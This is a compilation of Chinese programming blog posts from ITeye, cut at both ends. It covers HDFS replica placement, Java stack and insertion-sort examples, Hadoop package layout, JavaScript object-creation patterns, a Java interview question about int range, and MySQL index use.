       最近一有时间就在补数据结构和学Hadoop上的知识，今天看了一下Hadoop中的HDFS(分布式文件系统)中是怎么将文件写入HDFS中的，在将文件写入HDFS的时候有一件事情也在发生，就是文件复本的写入，这就又要牵扯到一个东西，就是文件复本的布局，今天就来谈谈文件的复本在datanode上是怎么个布局法。
       首先来说说文件复本是什么，其实从字面上也就知道了，其实他就是我们写入文件一模一样的东西，就是把文件复制了几份，在Hadoop中一般情况下复制数量是3份(这3个复本的datanode分布好后会构成一个管线)。为什么要复制了？就是为了防止数据丢失，当 一个datanode上的数据丢失或者损坏后，其他的节点上还有复本，就是为了这样才有了复本的出现。
        我们知道，namenode是领导，它负责统筹规划，因此数据块和 它们的复本分配到哪个datanode上也要听从他的指挥。它也不是随便乱分配的，它需要在”可靠性“，”写入宽带 “和”读取宽带“之间来权衡好。如果把所有的复本都写在一个datanode上的话，它的”写入宽带“最小，这个想也想得出，它不用把数据传出去嘛，它的复制管线都是在单一的节点上运行，但是这样如果该节点发生了故障，块中的数据就会丢失，也就是它不提供真实的”冗余“，  还有虽然它的”写入宽带很小“但是在同一机架上”读取宽带“很高，另一方面，把他们放在不同的数据中心，那样可以最大限度的提高冗余，但是宽带的损耗非常大。
         hadoop的默认布局策略是在运行客户端的节点上放第1个复本（如果客户端运行在集群之外，就随机的选择一个节点，但是系统会避免挑选那些存储太满或太忙的节点）。第2个复本放在与第1个不同且是随机选择的另外的机架中的节点上。第3个复本与第2个复本放在同一个机架上面，且是随机选择的一个节点，其他的复本放在集群中随机选择的节点上面，但是系统会尽量避免在相同的机架上面放太多的复本。
          一旦选定了复本的放置的位置，就会根据网络拓扑创建一个管线，如下图为一个典型的复本管线：
 
总的来说，这一方法不仅提供了很好的稳定性，数据不容易丢失（数据块存储在两个机架中）同时实现了很好的负载均衡，包括写入宽带（写入操作只要遍历一个交换机），读取性能（可以从两个机架中进行选择读取）和集群中块的均匀分布（客户端只在本地机架写入一个块）。
 
PS:以上的内容参考自《Hadoop 权威指南》。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
渣渣重走算法路之数组栈的实现, mntms.iteye.com.blog.2059108, Thu, 01 May 2014 16:53:50 +0800

        对待就要来临的期中考试，感觉头好大，看书看不下去的时候就敲敲代码，换个口味，今天敲了一下栈，是用数组实现的，当然也可以用链表来实现。
       栈的最大的特点就是“先进后出”，其实很像我们平时一起交作业，老师批改作业，越早交老师往往是最后才帮你改的，因为你的作业本被别人的作业本压在了下面嘛。但是也有喜欢好学生的老师，他会首先把成绩好的同学的作业或者卷子拿出来改，这样就不是栈的问题了，而是有一个优先级的考虑，也就是“优先级队列结构”。
          栈在计算机系统中的作用很大。主要在两个方面。
  1．函数的返回地址和参数
  2． 临时变量：包括函数的非静态局部变量以及编译器自动生成的其他临时变量。
   栈的原理图  ：                                        
 
由图可知：
1）从哪进就重哪里出去。
2）先进去的必定是最后才能出去的。
3）有一个东西指向了栈顶的元素。用来对栈中元素进行一些操作。而且总是指在栈顶的元素的。
 
代码实现。注释详细。
package 数组栈的实现;
public class StackX {
	
	 /*
	  *棧的最大容量 
	  */
	 private int maxSize;
	 
	 /*
	  * 存放数据的数组
	  */
	 private long[] stackArray;
	 
	 /*
	  * 指向栈顶元素的下标
	  */
	 private static int top;
	 
	 /*
	  * 构造方法，生成一个数组并初始化栈数组的大小，
	  * 并初始化指向顶部的下标。top = -1,表明栈
	  * 中还没有元素
	  */
	 public StackX(int maxSize) {
		 top = -1;
		 this.maxSize = maxSize;
		 stackArray = new long[maxSize];
	 }
	 
	 /*
	  * 向栈中压入一个元素
	  * top先上移一个位置，再在原来的下标处添加元素
	  * 为的是满栈的时候不会造成栈顶的元素被覆盖
	  */
	 public void push(long value) {
		
		 stackArray[++top] = value;
	 }
    
	 /*
	  * 弹出栈顶的元素，先弹出栈顶的元素
	  * 然后指向栈顶的top再往下移动一个下标，
	  * 这样做的是为了当栈里面只有一个元素的时候
	  * 不会照成最后一个元素pop不出来，因为如果先移动
	  * 栈顶元素，top=-1了，这时默认已经为空了，而实际上
	  * 里面还有一个元素
	  */
	 public long pop() {
		 return stackArray[top--];
	 }
	 
	 /*
	  * 判断栈是否为空，当top==-1的时候，返回true
	  */
	 public boolean isEmpty() {
		 return top==-1;
	 }
	 
     /*
	  * 判断栈是否满了，当top==(maxSize-1)的时候,返回true
	  */
	 public boolean isFull() {
		 return (top >(maxSize-1)); 
	 }
	 
	 /*
	  * 查看栈顶的元素
	  */
	 public long peek() {
		 return stackArray[top];
	 }
	 
	 
	 public static void main(String[] args) {
		 StackX stackX = new StackX(10);
		 //没有压入元素的时候看看栈是不是空的
		 System.out.println("此时栈是不是空的？  "+stackX.isEmpty());
		 //像栈里面压入元素，栈顶的元素应该是最后一个压入的
		 stackX.push(23);
		 stackX.push(13);
		 stackX.push(2);
		 stackX.push(123);
		 stackX.push(233);
		 stackX.push(3);
		 stackX.push(209);
		 
		 //查看栈顶的元素
		 System.out.println("查看栈顶的元素此时栈顶的元素应该为最后压入的那一个： "+stackX.peek());
		 
		 //查看是否栈满了
		 System.out.println("此时栈满了没有？ "+stackX.isFull());
		 
		 //弹出两个试试
		 System.out.println("弹出两个元素：");
		 System.out.println("弹出的元素为： "+stackX.pop());
		 System.out.println("弹出的元素为： "+stackX.pop());
		 
		 //再打印栈顶的元素
		 System.out.println("弹出两个元素后栈顶元素变为： "+stackX.peek());
		 
		 
	}
}
  
运行结果：
此时栈是不是空的？  true
查看栈顶的元素此时栈顶的元素应该为最后压入的那一个： 209
此时栈满了没有？ false
弹出两个元素：
弹出的元素为： 209
弹出的元素为： 3
弹出两个元素后栈顶元素变为： 233
 
再扯几句：其中需要注意的两个地方就是push()方法，向栈里面压入元素的时候，一定要是先在指向栈顶的top先向上移动一个位置之后再往里面压入（++top）。 这样做是为了当栈已经满了的时候，如果先压入再上移的话，就会把原来栈顶的元素给覆盖掉了。pop()弹出元素的时候和压入的时候相反，是先弹出了当前的元素，再往下移动top,相应的操作位（top--）,这样是为了当里面只有一个元素的时候，如果是先移动，top指到了-1位置，这是默认为空了，这样最后一个元素就弹不出来了。用数组实现的时候还有一个问题就是开始就必须指定了栈的大小，这样在我们push()超过数组的最大容量的时候会有异常抛出，这个可以在操作前先进行判断，确定栈还没满的情况下再往里面压入元素。 
         
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
数据结构之对象排序, mntms.iteye.com.blog.2059009, Wed, 30 Apr 2014 20:09:08 +0800

        前面写的几个排序的算法都是对整形的数据进行排序，而我们在日常生活中要处理的东西并不全都是这些整形的数据，还有一些其他的东西，比如对一堆人按照姓氏的前后进行排序，或则是对一些产品按照出产的日期进行排序，等等等等，这些东西都不是我们做排序算法的时候用来做测试的数据类型，但是我们要知道一个理念，就是我们从书上或则是其他的地方知道的常用的排序的方法也就只有那么一些，我们要做的只是稍微改变一下，整形是数据类型，既然是类型，他能对类型进行排序，我们也可以用他来对其他的类型来进行排序，其他的类型当然就包括了我们自己定义的类。只要你规定好排序的要求就OK了。
         今天要写的是一个基于前面写的一个插入排序，用它来对自己定义的Person类的对象按照其姓氏的前后顺序进行排序，毫无疑问，我们就要定义一个Person的类，里面当然要有“姓”的属性。还封装了一些其他的方法，包括打印Person对象的信息（displayInfo()），获得Person对象的“姓”（getLastName()）代码如下。
 
package 对象排序;
public class Person {
	
	/*
	 * lastName 姓
	*/
	private String lastName;
	
	/*
	 * FirstName 名
	*/
	private String FirstName;
	
	/*
	 * 年龄
     */
	private int age;
	
	/**
	 * 构造方法
	 * @param lastName 姓
	 * @param FirstName 名
	 * @param age 年龄
	 */
	public Person(String lastName,String FirstName,int age) {
		this.lastName = lastName;
		this.FirstName = FirstName;
		this.age  = age;
		}
	
	/*
	 * 打印人的信息
	 */
	public void displayInfo() {
		System.out.print("Last Name: " + lastName);
		System.out.print("   First Name: " + FirstName);
		System.out.println("   age : "+ age);
	}
	
	/*
	 * 返回某人的姓
	 * @return 返回某人的姓 
	 */
	public String getLastName() {
		return lastName;
	}
}
    建好了自己定义的类，而且也说明了对象按照姓氏的前后顺序进行排列，下面我们就来完成它，在这里饿哦们调用了接口 Comparable<String> 中的 compareTo方法对姓氏的前后进行比较然后进行交换（比较和交换也就是所有排序算法的核心了），代码有详 细注释：
 
 
package 对象排序;
public class ObjectInsertSort {
       
	/*
         *定义一个“人”的数组
         */
	private Person[] pers;
       
        /*
         *记录数组中当前的人数
         */
	public static int number;
	
	/*
	 * 构造函数初始化
         *传入max函数，定义了数组的最大值
	 */
	public ObjectInsertSort(int max) {
		pers = new Person[max];
		number = 0;
	}
	
	/**
	 * 向数组中插入一个人的对象
	 * @param last 传入的姓
	 * @param first 传入的名
	 * @param age 传入的年龄
	 */
	public void insertPerson(String last,String first,int age) {
		pers[number] = new Person(last,first,age);
		number++;
	}
	
	/*
	 *打印出人数组的信息 
	 */
	public void disPlayPInfo() {
		for( int i = 0; i < number; i++){
			pers[i].displayInfo();         // 调用人的打印的方法
		}
	}
	
	/*
	 * 排序算法，基于插入排序,并且调用compareTo()方法对字符串的大小进行比较，
	 * 按照首字母A-Z,a-z越来越大,当首字母一样的时候依次往下进行。
	 * 若s2.compareTo(s1) > 0 则 s1>s2;
	 * 若s2.compareTo(s1) < 0则 s1<s2;
	 * 若s2.compareTo(s1) = 0则 s1=s2;
	 */
	public void objectInsertSort() {
		int out,in;
		for(out = 1; out < number; out++ ) {
			Person temp = pers[out];
			in = out;
			while(in > 0 && pers[in-1].getLastName().compareTo(temp.getLastName())>0) {
				pers[in] = pers[in-1];
				--in;
			}
			
			pers[in] = temp;
		}
	}
	
	
	public static void main(String[] args) {
		
		ObjectInsertSort ois = new ObjectInsertSort(10);
		ois.insertPerson("Harden", "James", 20);
		ois.insertPerson("ben", "Laden", 30);
		ois.insertPerson("Ben", "Laden", 30);
		ois.insertPerson("Ban", "Laden", 30);
		ois.insertPerson("Gaiz", "Bill",40);
		ois.insertPerson("Bush", "Joe", 50);
		System.out.println("当前的人数为："+number);
		System.out.println("没进行排序前:");
		ois.disPlayPInfo();
		
		System.out.println("排序后:");
		ois.objectInsertSort();
		ois.disPlayPInfo();
		
	}
}
    
 
    输入输出结果：
    
当前的人数为：6
没进行排序前:
Last Name: Harden   First Name: James   age : 20
Last Name: ben   First Name: Laden   age : 30
Last Name: Ben   First Name: Laden   age : 30
Last Name: Ban   First Name: Laden   age : 30
Last Name: Gaiz   First Name: Bill   age : 40
Last Name: Bush   First Name: Joe   age : 50
排序后:
Last Name: Ban   First Name: Laden   age : 30
Last Name: Ben   First Name: Laden   age : 30
Last Name: Bush   First Name: Joe   age : 50
Last Name: Gaiz   First Name: Bill   age : 40
Last Name: Harden   First Name: James   age : 20
Last Name: ben   First Name: Laden   age : 30
   
 
      PS :就这样我们完成了对老外的姓氏按照字母表的前后顺序进行的排序，要做的只是多了一个我们自己定义的一个类，还有的就是我们自己给老外取得一些蛋疼的名字，来给我们测试（老外的姓和名是和我大天朝的姓和名恰好是相反的，前面是名，后面是姓，也就是上面的lastName(姓)）。
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
hadoop源码分析（一）, mntms.iteye.com.blog.2050182, Sun, 20 Apr 2014 21:16:04 +0800

           懵懵懂懂，不知不觉和小伙伴们就搞到了云计算这个东西上来了，在没接触这个之前，心里只是充满了崇敬之情，现在还是充满崇敬之情，不同的想法就是现在大体知道了他是个什么东西，所谓的云计算就是（本人目前的肤浅的理解）“一大堆衣服自己慢慢洗经过很长时间也洗得完，但是把它分给许多人来洗是不是会快很多”云计算也就是这个意思，随着当今信息时代的告诉发展，数据可以说是爆发式的增长，而且数据中包含的信息越来越得到大家的重视，然而，数据是很乱的，很杂的，我们所需要的有用的信息也就只占其中的一部分，因此我们所要做的就是在大量数据中挖掘出我们所想要的数据，因此云计算就派上了用场了，把大量的数据分配到很多很多的机器上去处理就是云计算所要做的。
         上面说云计算就是把数据进行分配，让更多的机器来做一件大的事情，因此就到了今天的主角出场了“Hadoop”，Hadoop是一个能够对大量数据进行分布式处理的软件框架。 Hadoop 是以一种可靠、高效、可伸缩的方式进行处理的。
         如果要想知道Hadoop内部是怎么实现的 ，我们就要去看看他的源码了，网上 Hadoop源码分析一大堆,Apache官网也能下载，这几天看了一点，今天说说Hadoop中的包，他所有的包都在(org.apache.hadoop)下面。具体有以下一些包
hadoop中主要的五个包：
mapreduce:hadoop的Map/Reduce实现
fs:文件系统的抽象，可以理解为支持多种文件系统实现的统一文件访问接口
hdfs:HDFS，Hadoop的分布式文件系统的实现
ipc:一个简单的IPC的实现，依赖于io提供的编解码功能
io:表示层。将各种数据编码/解码，方便在网络上的传输
hadoop中其他的一些包：
tool：提供一些命令行工具，如DistCp,archive
filecache:提供HDFS文件的本地缓存，用于加快Map/Reduce的数据访问的速度
net:封装部分网络功能如：DNS，socket
security：用户和用户组的信息
conf:系统的配置参数
metrics:系统统计数据的收集，属于网管范畴
util：工具类
record：根据DDL（数据描述语言）自动生成他们的编解码函数，目前可以提供c++和Java
http:基于Jetty的HTTP Servlet,用户通过浏览器可以观察文件系统的一些状态信息和日志
log：提供HTTP访问日志的HTTP Servlet
   
     慢慢来，继续我们的源码之路，任重道远。
             
           
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
现实中没有对象，今天在JavaScript中弄几个, mntms.iteye.com.blog.2046035, Tue, 15 Apr 2014 01:16:45 +0800

        最近在学习网页上面的一些知识，从HTML到CSS，慢慢的就接触到了JavaScript，今天就来谈谈Javascript中的面向对象的一点知识，当是对自己这几天学到的东西的一点巩固，也谈谈一下自己的一点点淡淡的理解。
     接触过面向对象语言的人都知道，Java语言无疑是面向对象思想最好的诠释者，今天要说的Javascript，前面也带一个Java，大家可能就会把Javascript和Java联系到一起，开始的时候我也以为他们是有着很亲密的关系，我还特意百度了一下Java和Javascript的关系，才知道他们两个的区别。以下来自百度。
    “很多人看到 Java 和 JavaScript 都有“Java”四个字，就以为它们是同一样东西，其实它们是完完全全不同的两种东西。Java在客户端的运行的应用程序叫做 Java Applet，是嵌在网页中，而又有自己独立的运行窗口的小程序。Java Applet 是预先编译好的，一个 Applet 文件（.class）用 Notepad 打开阅读，根本不能理解。Java Applet 的功能很强大，可以访问 http、ftp等协议，甚至可以在电脑上种病毒（已有先例了）。相比之下，JavaScript 的能力就比较小了。JavaScript 是一种“脚本”（“Script”），它直接把代码写到 HTML 文档中，浏览器读取它们的时候才进行编译、执行，所以能查看 HTML 源文件就能查看JavaScript 源代码。JavaScript 没有独立的运行窗口，浏览器当前窗口就是它的运行窗口。
　　Java是由Sun Microsystems公司于1995年5月推出的Java程序设计语言和Java平台的总称。用Java实现的HotJava浏览器（支持Java applet）显示了Java的魅力：跨平台、动感的Web、Internet计算。从此，Java被广泛接受并推动了Web的迅速发展，常用的浏览器现在均支持Java applet。另一方面，Java技术也不断更新。
　　Java平台由Java虚拟机（Java Virtual Machine）和Java 应用编程接口（Application Programming Interface、简称API）构成。Java 应用编程接口为Java应用提供了一个独立于操作系统的标准接口，可分为基本部分和扩展部分。在硬件或操作系统平台上安装一个Java平台之后，Java 应用程序就可运行。现在Java平台已经嵌入了几乎所有的操作系统。这样Java程序可以只编译一次，就可以在各种系统中运行。
　　Java分为三个体系JavaSE，JavaEE,JavaME”
    通过上面的解释大家可能知道了Java和Javascript的区别，他们可以说是风马牛不相及，但是他们也有相似的地方，都有“面向对象”的思想在里面，下面就来说说Javascript中的面向对象，随便弄几个对象出来。
   
   No.1:工厂模式的方法
    
/*工厂模式*/
function creatObject(name,age) {
	var obj = new Object();          //创建对象
	obj.name = name;				 //添加属性
	obj.age = age;					 
	obj.run = function() {            //添加方法
		return this.name + this.age;
		};
	return obj;			//返回对象
	};
var box1 = creatObject('TMS',100);     //生成对象
var box2 = creatObject('TNT',200);       
  
 
  No.2:使用构造函数
  
/*构造函数不用返回对象引用，不需要return语句，首字母必须大写，普通的方法名首字母小写如：function box();*/
function Box(name,age) {
	this.name = name;
	this.age = age;
	this.run = function() {
		return this.name + this.age;	
		};
	};
//实例化
var box1 = new Box('TMS',100);
var box2 = new Box('TNT',103);
 
 
  No.3:使用原型创建（JavaScript 是基于原型的语言）使用prototype关键字添加属性和方法
  这样的构造有个缺陷就是实例化的对象中的属性是一样的，而且实例化的对象的地址也是一样的，有点坑。
  
//原型方式构造,属性和方法的地址是一样的，构造方法中是不一样的
function Box(){};                 //构造函数中什么都没有
Box.prototype.name = 'TMS';       //原型属性
Box.prototype.age = '100';        //原型属性
Box.prototype.run = function() {  //原型方法
	return this.name+this.age;
	};
var box1 = new　Box();
var box2 = new Box();
alert(box1.run()==box2.run());   //true;
 
 
  No.4:使用字面量的方式创建原型对象,这和第三种方法相似，个人感觉就是把所有的属   性和方法写到一起了，没什么大的变化。
  
functoin Box(){};
//使用字面量的方式创建原型对象,
Box.prototype = {
	name:'TMS';
	age:'100';
	run:function() {
		return this.name+this.age;
	};
};
var box1 = new Box();  //实例化对象
 
 
  No.5:组合模式加原型函数，保持独立性(这是最好的一种方式了)看了就知道。
  
//组合模式加原型函数，保持独立性
function Box(user,age) {			//	为保持独立性用构造方法
	this.user = user;
	this.age = age;
	this.family=['aaa','ddd','jjj'];
};
Box.prototype = {            //为保持共享用原型
	constructor:Box,       //强制指向Box
	run:function() {
		return this.age+this.user;
	}
};
var box1 = new Box('TMS','100');
var box2 = new Box('TNT','190');
box1.family.push('sss');    //实例化对象1中添加的值不会共享到实例化2中去，保持了独立性
    
//alert(box1.run());
alert(box1.family);     //打印出‘aaa,ddd,jjj,sss’
//alert(box2.run());
alert(box2.family);    //引用类型没有使用原型，所以没有共享，打印的还是'aaa,ddd,jjj'
 
 
  No.6:寄生构造函数=工厂模式（有return）+构造函数（有构造函数的传参）
 
function Box(name,age) {
	var obj = new Object();
	obj.name = name;
	obj.age = age;
	obj.run = function() {
		return this.name+this.age;
	};
	
	return obj;
}
var box1 = new Box("TMS",'100');          //实例化对象
var box2 = new Box('TNT','100');
 
 
  No.7:稳妥构造函数，里面不能用this,外面实例化对象不能用new(神一样的规定)
  
function Box(name,age) {
	var obj = new Object();
	obj.name = name;                     //没有使用‘this'关键字
	obj.age = age;
	obj.run = function() {
		return obj.name+obj.age;
	};
	return obj;
}
var box1 = Box('TMs','100');       //实例化，注意没有用到'new'关键字
var box2 = Box('TNT','130');
 
 
  
以上的7种方法就是最近学到的Javascript中面向对象的东东，方法都感觉大同小异，有过一点面向对象知识的人都能理解那些简单的代码，但是每一种方法中更深层次的东西可能我还没有理解，比如底层的调用的一些机制，还有包括内存消耗，效率等等，望大神能解释！
 
PS:好了！睡觉！晚上吃多了会长胖！
 
         
已有 8 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
渣渣重走算法路之简单排序（插入）, mntms.iteye.com.blog.2044606, Mon, 14 Apr 2014 00:49:53 +0800

         今天继续排序之路，今天要贴出的是插入排序，也属于简单的排序，对于数量小的排序，它还是一个很有效的算法，
      
      以下属于本人 粗暴讲解
      
       原理：
       它的工作方式很像人们打牌插牌一样，从起得第一张牌开始，然后接下来的到的牌如果比手里的牌大就放后面，如果比前面的牌小就放在前面，一样大的就和当前的牌搁一起就可以了，起完所有的牌，按照这样的方法就能把手里的牌排好序了。所以会从待排序的第二个元素开始，然后和前面的数进行比较。依次下去，直到最后一个元素。
     
        时间复杂度：
        和前面的冒泡排序有的一拼http://mntms.iteye.com/admin/blogs/2044246也是O(n2);所以当要处理的数据量很大的时候效率还是有那么低，当然，当处理少量数据的时候，它和冒泡排序一样是值得选择的，因为比较简单嘛，而且也容易理解。
     
 
         图文理解：
         
   
 
          代码：
   
package 插入排序;
/**
 * 插入排序
 * @author TMs
 *
 */
public class InsertionSort {
	private long[] array;
	private int count;
	
	public static void main(String[] args) {
		InsertionSort is = new InsertionSort(10);
		is.insert(34);
		is.insert(4);
		is.insert(3);
		is.insert(234);
		is.insert(334);
		is.insert(24);
		is.insert(0);
		is.insert(3224);
		is.insert(134);
		is.insert(0);
		
		is.getSize();
		System.out.println("排序前：");
		is.display();
		is.insertionSort();
		System.out.println("排序后：");
		is.display();
	}
	
	/**
	 * 构造一个大小为max的数组大小
	 * @param max 数组的元素个数的最大值
	 */
	public InsertionSort(int max) {
		array = new long[max];
		count = 0;
	}
	
	/**
	 * 向数组中插入一个值
	 * @param value 插入的值
	 */
	public void insert(long value) {
		array[count] = value;
		count++;
	}
	
	/**
	 * 打印 当前数组中的个数
	 */
	public void getSize() {
		System.out.println("数组中当前元素的总数为："+count);
	}
	
	/**
	 * 打印数组中的元素
	 */
	public void display() {
		for(int i = 0; i < count; i++) {
			System.out.println("array["+i+"]="+array[i]+" ");
		}
		System.out.println();
	}
	
	/**
	 * 对数组进行插入排序
	 */
	public void insertionSort() {
		for(int i=count-1; i > 0; i--) {
			for(int j = count-i; j>0; j--) {
				if(array[j]<array[j-1]) {
					exchange(j,j-1);
				}
			}
		}
	}
	
	/**
	 * 交换元素 
	 * @param x 下标x
	 * @param y 下标y
	 */
	public void exchange(int x,int y) {
		long  temp;
		temp = array[x];
		array[x] = array[y];
		array[y] = temp;
	}
}
           输入输出结果：
 
数组中当前元素的总数为：10
排序前：
array[0]=34 
array[1]=4 
array[2]=3 
array[3]=234 
array[4]=334 
array[5]=24 
array[6]=0 
array[7]=3224 
array[8]=134 
array[9]=0 
排序后：
array[0]=0 
array[1]=0 
array[2]=3 
array[3]=4 
array[4]=24 
array[5]=34 
array[6]=134 
array[7]=234 
array[8]=334 
array[9]=3224 
  
 
 PS:第二个简单的排序，希望自己能坚持每天能搞懂一个东西，然后贴出来（这可能是 最好的了）学  校的课也多，大二狗也只能每天在这个时候安安静静的写写blog，对一天的总结，也对自己的一个交  代，睡觉，晚上吃多了会长胖！
       
       
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
插入排序, chenchh201307094510.iteye.com.blog.2059826, Sun, 04 May 2014 20:37:24 +0800

import java.util.Arrays;
public class InsertionSort {
	private static int[] insertionSort(int[] array){
		if(array == null || array.length <= 1){
			return array;
		}else{
			for(int i=1; i<array.length; i++){
				for(int j=0; j<i; j++){
					if(array[j]<=array[i]){
						continue;
					}else{
						int temp = array[i];
						array[i] = array[j];
						array[j] = temp;
					}
				}
			}
		}
		
		return array;
	} 
	
	public static void main(String[] args) {
		int length = 10;
		int[] a = new int[length];
		for(int i=0; i<length; i++){
			a[i] = (int) (Math.random() * 100);
		}
		
		System.out.println("原始数组：" + Arrays.toString(a));
		
		System.out.println("排序后：" + Arrays.toString(insertionSort(a)));
	}
}
 
 
def insertion_sort(n):
	if len(n) == 1:
		return n
	b = insertion_sort(n[1:])
	m = len(b)
	for i in range(m):
		if n[0] <= b[i]:
			return b[:i]+[n[0]] + b[i:]
	return b + [n[0]]
print insertion_sort([1,4,10,6,2,9])
 
 
def insertion_sort(n):
	if len(n) == 1:
		return n
	for i in range(1, len(n)):
		for j in range(i):
			if n[j] <= n[i]:
				pass
			else:
				n[i],n[j] = n[j],n[i]
	return n
print insertion_sort([1,4,10,6,2,9,-1])
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
面试难题：Java中整数的范围和大小, chenchh201307094510.iteye.com.blog.2059804, Sun, 04 May 2014 19:12:45 +0800

从进入百度后到现在，一直在参与公司和部门的面试工作，包括校招、社招。最开始做面试的时候，一直
苦恼该如何来确认面试者的技术水平，java的内容就那么一点，网上到处流传着各大互联网各种各样的面试笔试题，各培训机构甚至有专门的针对面试的培训，凡此种种都加大了面试官筛选的难度。
为了提高面试的效率，便自己整了一套题，由易到难进行排序，以便区分不同的层次。然而面试时间长了
之后，发现摆在最前面的一道题，却鲜有人能够给出完全正确的答案。下面我们来看看这道题：
写道
Java中整数的范围是多少，使用二进制或者指数表示
       有一部分人能回答出整数是4个字节（对于回答其他答案的，我就不吐槽了），但是就是写不出二进制表
示，此时，我一般会进一步提示性的给个问题：
写道
一个字节是多少位
        这个问题，基本上大部分人也都能回答出来。可是，继续回到上一个问题，依然给不出答案。
 
 
       有那么几个人，给出的答案是-（2的32次）到2的32次，我一般也会提醒的问到：
写道
整数的二进制的第一位是做什么用的
       当然，大部分人也都知道这个是符号位，回到原题，依然不能给出正确的答案。
 
       有人记得要减1，但是减到指数上去了，提示问为什么要在指数减一，不知所以。
 
       提示性的问：
写道
正负3的二进制如何表示
     那些口口声声说int是32位的人，却只写出8位或者16位长度的二进制，反问他为何是8或者16，也是不知所以，当然也不知道错误。
 
 
面试到如今，大概也面了几十人了，只通过了不到3个人。刚开始的时候，心里会发虚，总觉得自己搞
的面试题是不是太古怪了，后来遇到一些优秀的人，这些题对于他们来说都是小儿科，尤其是做校招的时候，基本大部分的人都能正确回答出这个问题，不管是做c、c++还是java。做社招的时候，一般的套路都是java基础、项目经验、开源等，基本不会问算法。而做校招的时候，没有项目经验，但是语言基础是必备的，排序算法手写，更深入的动态规划、贪心等策略，都会有涉及，而操作系统的一些基本原理更是必不可少，大概能有7-8成的人能通过面试。
从多年前第一次面试别人开始，从来没有人告诉我该如何面试，慢慢到今天，也从来没有系统的看过面
试相关的理论，一直迷茫，不知道该以什么标准来选择一个技术人。而直到有一天，现在的老大说，“你觉得你愿意与之共事就行”，才豁然开朗。我希望和什么样的人共事呢，我想至少要达到以下几点：
1. 热爱技术，愿意刨根问底
2. 知其然也知其所以然
3.踏实
 
如此而已。
 
 
 
已有 5 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
MySQL如何使用索引, chenchh201307094510.iteye.com.blog.2053194, Wed, 23 Apr 2014 15:52:58 +0800

     给定特定的列的值查找满足条件的行，索引的使用能够加快查找的速度。如果没有索引，MySQL将从第一行记录开始，穿越整个表找到相应的记录，表越大，相应的查询的代价也就越大。如果针对查询中的列有索引，MySQL就能在数据文件中快速确定需要查找的位置，再也不用穿越整个表来捞数据了。如果一个表有1000条数据，这样至少能比整表顺序读取捞数据快100倍。如果你的查询结果包含了整表的大部分记录，它也比没有索引整表捞数据要快，至少减少了磁盘的寻址时间。
 
    大部分的MySQL索引(PRIMARY KEY, UNIQUE, INDEX, FULLTEXT)都是以B-Tree结构来存储，而空间数据索引则使用R-Tree结构来存储，内存表则使用哈希索引。
 
    字符串在创建索引时会自动去除首尾的空白。
 
    MySQL会在以下操作时使用索引：
快速查找匹配where语句的行记录时。
预计能够缩小结果的范围时。如果查询能够匹配多个索引，MySQL一般会使用能够过滤出结果最少的索引。
join操作时从其他表捞数据。在join时，如果声明关联的列类型和大小相同，MySQL在使用索引时能够更加高效。在这里，如果VARCHAR 和CHAR的大小相同，他们在类型上会被认为是相同的。例如VARCHAR(10)和CHAR(10)是大小相同的，但是VARCHAR(10)和CHAR(15)的大小是不同的。
       在两个不同的列之间进行比较，例如string和temporal，或者numeric，不能方便直接进行比较，将妨碍  
       索引的使用。假设一个numeric列和一个string列进行比较，对于numeric列中给定的一个值，比如1，它可能会和
         string中的很多值相同，例如：'1', ' 1', '00001', 或者 '01.e1'。string列上的任何索引对这种查询没有任何意义和帮助。
获取已有索引列的MIN()、MAX()值。在执行这两个聚合函数的时候，预处理过程会在使用该列的索引之前会首先检查where语句中是否包含有其他索引列的等于限定条件，并从该索引中分别查询一次MIN和MAX，并将获取到的常量值返回，整个查询将一次返回，而不用做原始列的全索引扫描。例如：在已有索引的列column1上获取其MIN、MAX值，如果在where中包含有”column2=常量“，而column2、column1构建有复合索引，这种情况下，MySQL将不会查找column1的索引，而是在column2、column1的复合索引中进行查找，并能一次获取到结果，不用穿越整个索引。
如果在一个已经排序并分组的最左前缀索引上执行sort或者group，例如：ORDER BY key_part1, key_part2，key_part1, key_part2是复合索引的列，如果所有的key都是DESC的，key将会反序读取。
在某些情况下，一个查询通过优化，可以不用通过获取行数据而得到结果。如果一个查询只使用了numeric列，并且这些列参与构建了最左前缀索引，那么MySQL可以直接从索引中获取到需要的结果，而不用访问具体的数据。这也就是所谓的”覆盖索引“，例如：
SELECT key_part3 FROM tbl_name
  WHERE key_part1=1
 key_part1、key_part3属于一个最左前缀索引。假设执行以下的SQL语句：
SELECT * FROM tbl_name WHERE col1=val1 AND col2=val2;
 如果在col1、col2上有一个复合索引，对应的查询结果就能直接获取到。如果在col1、col2只有分别的单列索引，优化器就会尝试使用索引合并进行优化，或者看哪个索引返回的结果集更好，然后根据该结果集去表中读取数据。
         如果该表有一个多列索引，该索引的任意最左前缀都能被优化器使用。例如，如果在(col1, col2, col3)上有一个三列索引，则基于(col1)、(col1,col2)、(col1,col2,col3)的查询都会使用到该索引。
        如果使用的列不能构成一个最左前缀，MySQL就无法使用索引了，假设有如下的SQL查询：
SELECT * FROM tbl_name WHERE col1=val1;
SELECT * FROM tbl_name WHERE col1=val1 AND col2=val2;
SELECT * FROM tbl_name WHERE col2=val2;
SELECT * FROM tbl_name WHERE col2=val2 AND col3=val3;
       如果在(col1, col2, col3)构建索引，那么就只有头两个SQL查询能够使用索引。第三个、第四个查询虽然也使用到了被索引的列，但是(col2) 和(col2, col3)不是(col1, col2, col3)的最左前缀。
 
 
B-Tree索引的特性
        B-Tree索引在进行=, >, >=, <, <=, 或者 BETWEEN等比较操作的时候能够被使用，在使用LIKE操作符时，如果操作的字符串是常量，且不以通配字符开头，也可以使用索引，如下所示的select查询将使用索引：
